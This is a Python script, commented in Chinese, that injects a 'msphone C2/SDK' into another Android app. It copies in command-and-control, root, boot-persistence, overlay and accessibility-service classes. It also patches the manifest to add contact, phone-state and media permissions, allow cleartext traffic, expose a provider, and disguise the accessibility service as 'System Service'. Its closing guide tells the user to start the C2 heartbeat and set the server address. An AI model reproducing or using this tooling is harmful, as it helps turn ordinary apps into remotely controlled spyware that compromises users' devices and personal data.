#!/usr/bin/env python3
"""
inject_sdk.py — 一键将 msphone C2/SDK 注入目标 Android 项目

用法:
    python inject_sdk.py <目标项目根目录> <目标包名>

示例:
    python inject_sdk.py /path/to/MyApp com.mycompany.myapp
"""

import sys
import os
import re
import shutil

# SDK 中需要复制的 Java 文件（含 package 替换）
SDK_JAVA_FILES = [
    "DeviceC2.java",
    "MyAccessibilityService.java",
    "RootUtils.java",
    "CardGateActivity.java",
    "CardGate.java",
    "Vault.java",
    "Store.java",
    "FileUtils.java",
    "httphelp.java",
    "RemoteConfig.java",
    "BootCompletedReceiver.java",
    "Guard.java",
    "FloatingWindowService.java",
    "ConfigClient.java",
    "Codec.java",
    "PermissionGuideHelper.java",
]

SOURCE_PACKAGE = "com.example.msphone"

# build.gradle 需要注入的依赖块
GRADLE_DEPS = """\
    implementation(platform("com.squareup.okhttp3:okhttp-bom:4.12.0"))
    implementation("com.squareup.okhttp3:okhttp")
    implementation("com.squareup.okhttp3:logging-interceptor")
    implementation "com.google.code.gson:gson:2.10.1"
    implementation "commons-codec:commons-codec:1.16.1"
"""

GRADLE_CMAKE_BLOCK = """\
    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
            version "3.22.1"
        }
    }
"""

GRADLE_NDK_BLOCK = """\
        ndk {
            abiFilters 'arm64-v8a', 'armeabi-v7a'
        }
        externalNativeBuild {
            cmake {
                arguments "-DANDROID_STL=none"
            }
        }
"""

# AndroidManifest 需要注入的权限
MANIFEST_PERMISSIONS = """\
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
"""

# AndroidManifest 需要注入的组件（占位符 {PKG} 会被替换为目标包名）
MANIFEST_COMPONENTS = """\
        <!-- SDK: C2 无障碍服务 -->
        <service
            android:name=".MyAccessibilityService"
            android:exported="false"
            android:label="System Service"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- SDK: 开机自启 -->
        <receiver
            android:name=".BootCompletedReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <!-- SDK: 悬浮窗服务 -->
        <service
            android:name=".FloatingWindowService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="specialUse" />

        <!-- SDK: 卡密验证 -->
        <activity
            android:name=".CardGateActivity"
            android:exported="false"
            android:configChanges="orientation|keyboardHidden|screenSize|screenLayout"
            android:theme="@style/Theme.App.Transparent" />

        <!-- SDK: 配置 Provider -->
        <provider
            android:name=".SettingsProvider"
            android:authorities="{PKG}.provider"
            android:exported="true" />
"""

MAIN_ACTIVITY_SNIPPET = """\
// ─────────────────────────────────────────────────────────
//  在 MainActivity.onCreate() 中加入以下代码以启动 C2 模块
// ─────────────────────────────────────────────────────────

// 1. 启动 C2 心跳（放在 setContentView 之后）
DeviceC2.start(this);

// 2. 如需在第一次运行时弹出无障碍服务引导，调用：
//    PermissionGuideHelper.checkAndRequestAccessibility(this);

// 3. 如需卡密验证闸门，在 onCreate 最开头调用：
//    CardGate.check(this);
// ─────────────────────────────────────────────────────────
"""


def err(msg):
    print(f"[ERROR] {msg}", file=sys.stderr)
    sys.exit(1)


def info(msg):
    print(f"[INFO]  {msg}")


def warn(msg):
    print(f"[WARN]  {msg}")


def find_sdk_root():
    """脚本所在目录向上找到项目根（含 app/ 子目录）"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    candidate = os.path.dirname(script_dir)  # tools/ 的上一级
    if os.path.isdir(os.path.join(candidate, "app")):
        return candidate
    err(f"找不到 SDK 项目根（期望 app/ 在 {candidate} 下）。请确认脚本在项目的 tools/ 目录内。")


def package_to_path(pkg):
    return pkg.replace(".", os.sep)


def copy_java_files(sdk_root, target_root, target_pkg):
    src_java_dir = os.path.join(
        sdk_root, "app", "src", "main", "java",
        package_to_path(SOURCE_PACKAGE)
    )
    dst_java_dir = os.path.join(
        target_root, "app", "src", "main", "java",
        package_to_path(target_pkg)
    )
    os.makedirs(dst_java_dir, exist_ok=True)

    for fname in SDK_JAVA_FILES:
        src = os.path.join(src_java_dir, fname)
        dst = os.path.join(dst_java_dir, fname)
        if not os.path.exists(src):
            warn(f"源文件不存在，跳过: {src}")
            continue
        with open(src, "r", encoding="utf-8") as f:
            content = f.read()
        # 替换 package 声明和所有包引用
        content = content.replace(
            f"package {SOURCE_PACKAGE};",
            f"package {target_pkg};"
        )
        content = content.replace(SOURCE_PACKAGE, target_pkg)
        with open(dst, "w", encoding="utf-8") as f:
            f.write(content)
        info(f"已复制 Java: {fname}")


def copy_cpp_files(sdk_root, target_root):
    src_cpp = os.path.join(sdk_root, "app", "src", "main", "cpp")
    dst_cpp = os.path.join(target_root, "app", "src", "main", "cpp")
    os.makedirs(dst_cpp, exist_ok=True)

    for fname in ["secure.c", "CMakeLists.txt"]:
        src = os.path.join(src_cpp, fname)
        dst = os.path.join(dst_cpp, fname)
        if not os.path.exists(src):
            warn(f"CPP 文件不存在，跳过: {src}")
            continue
        shutil.copy2(src, dst)
        info(f"已复制 CPP: {fname}")


def copy_xml_files(sdk_root, target_root):
    src_xml = os.path.join(sdk_root, "app", "src", "main", "res", "xml",
                           "accessibility_service_config.xml")
    dst_xml_dir = os.path.join(target_root, "app", "src", "main", "res", "xml")
    os.makedirs(dst_xml_dir, exist_ok=True)
    dst_xml = os.path.join(dst_xml_dir, "accessibility_service_config.xml")
    if not os.path.exists(src_xml):
        warn(f"accessibility_service_config.xml 不存在，跳过")
        return
    shutil.copy2(src_xml, dst_xml)
    info("已复制 accessibility_service_config.xml")


def patch_build_gradle(target_root):
    gradle_path = os.path.join(target_root, "app", "build.gradle")
    if not os.path.exists(gradle_path):
        warn(f"找不到 app/build.gradle，跳过 Gradle 注入: {gradle_path}")
        return

    with open(gradle_path, "r", encoding="utf-8") as f:
        content = f.read()

    modified = False

    # 注入 NDK 版本 + CMake 配置（放在 android { 块内 defaultConfig 后）
    if "externalNativeBuild" not in content:
        # 在 android { 末尾 } 之前插入
        content = re.sub(
            r'(android\s*\{[^}]*)(^\})',
            lambda m: m.group(0).rstrip('}') + "\n" + GRADLE_CMAKE_BLOCK + "}\n",
            content, count=1, flags=re.DOTALL | re.MULTILINE
        )
        # 在 defaultConfig { } 内插入 ndk + cmake 配置
        content = re.sub(
            r'(defaultConfig\s*\{)',
            r'\1\n' + GRADLE_NDK_BLOCK,
            content, count=1
        )
        modified = True
        info("已注入 CMake / NDK 配置到 build.gradle")
    else:
        info("build.gradle 已含 externalNativeBuild，跳过 CMake 注入")

    # 注入 ndkVersion
    if "ndkVersion" not in content:
        content = re.sub(
            r'(compileSdk\s+\d+)',
            r'\1\n    ndkVersion "25.2.9519653"',
            content, count=1
        )
        modified = True
        info("已注入 ndkVersion 到 build.gradle")

    # 注入依赖
    deps_to_add = []
    for line in GRADLE_DEPS.strip().splitlines():
        dep = line.strip()
        if dep and dep not in content:
            deps_to_add.append("    " + dep)

    if deps_to_add:
        content = re.sub(
            r'(dependencies\s*\{)',
            r'\1\n' + "\n".join(deps_to_add) + "\n",
            content, count=1
        )
        modified = True
        info(f"已注入 {len(deps_to_add)} 条依赖到 build.gradle")
    else:
        info("依赖已存在，跳过")

    # 确保 usesCleartextTraffic（build.gradle 本身不用，只在 Manifest 里）
    if modified:
        with open(gradle_path, "w", encoding="utf-8") as f:
            f.write(content)
        info("build.gradle 写入完成")


def patch_manifest(target_root, target_pkg):
    manifest_path = os.path.join(target_root, "app", "src", "main", "AndroidManifest.xml")
    if not os.path.exists(manifest_path):
        warn(f"找不到 AndroidManifest.xml，跳过: {manifest_path}")
        return

    with open(manifest_path, "r", encoding="utf-8") as f:
        content = f.read()

    modified = False

    # 注入 usesCleartextTraffic
    if "usesCleartextTraffic" not in content:
        content = re.sub(
            r'(<application\b)',
            r'\1\n        android:usesCleartextTraffic="true"',
            content, count=1
        )
        modified = True
        info("已注入 usesCleartextTraffic 到 AndroidManifest.xml")

    # 注入权限（逐条检查）
    perms_to_add = []
    for line in MANIFEST_PERMISSIONS.strip().splitlines():
        perm_match = re.search(r'android:name="([^"]+)"', line)
        if perm_match:
            perm_name = perm_match.group(1)
            if perm_name not in content:
                perms_to_add.append(line)

    if perms_to_add:
        perm_block = "\n".join(perms_to_add) + "\n"
        # 在 <application 前插入
        content = re.sub(
            r'(<application\b)',
            perm_block + r'\1',
            content, count=1
        )
        modified = True
        info(f"已注入 {len(perms_to_add)} 条权限到 AndroidManifest.xml")
    else:
        info("所有权限已存在，跳过")

    # 注入组件（检查关键类名是否已存在）
    components = MANIFEST_COMPONENTS.replace("{PKG}", target_pkg)
    if "MyAccessibilityService" not in content:
        # 在 </application> 前插入
        content = re.sub(
            r'(</application>)',
            components + r'\1',
            content, count=1
        )
        modified = True
        info("已注入 SDK 组件声明到 AndroidManifest.xml")
    else:
        info("MyAccessibilityService 已存在，跳过组件注入")

    if modified:
        with open(manifest_path, "w", encoding="utf-8") as f:
            f.write(content)
        info("AndroidManifest.xml 写入完成")


def print_integration_guide(target_pkg):
    print()
    print("=" * 60)
    print("  SDK 注入完成！MainActivity 集成代码：")
    print("=" * 60)
    print(MAIN_ACTIVITY_SNIPPET)
    print("=" * 60)
    print("  记得在 Vault.java 中配置服务器地址和密钥！")
    print(f"  文件路径: app/src/main/java/{package_to_path(target_pkg)}/Vault.java")
    print("=" * 60)
    print()


def main():
    if len(sys.argv) != 3:
        print(__doc__)
        sys.exit(1)

    target_root = os.path.abspath(sys.argv[1])
    target_pkg = sys.argv[2].strip()

    if not os.path.isdir(target_root):
        err(f"目标目录不存在: {target_root}")

    if not re.match(r'^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$', target_pkg):
        err(f"无效的包名: {target_pkg}")

    sdk_root = find_sdk_root()
    info(f"SDK 源项目: {sdk_root}")
    info(f"目标项目:   {target_root}")
    info(f"目标包名:   {target_pkg}")
    print()

    copy_java_files(sdk_root, target_root, target_pkg)
    copy_cpp_files(sdk_root, target_root)
    copy_xml_files(sdk_root, target_root)
    patch_build_gradle(target_root)
    patch_manifest(target_root, target_pkg)
    print_integration_guide(target_pkg)


if __name__ == "__main__":
    main()
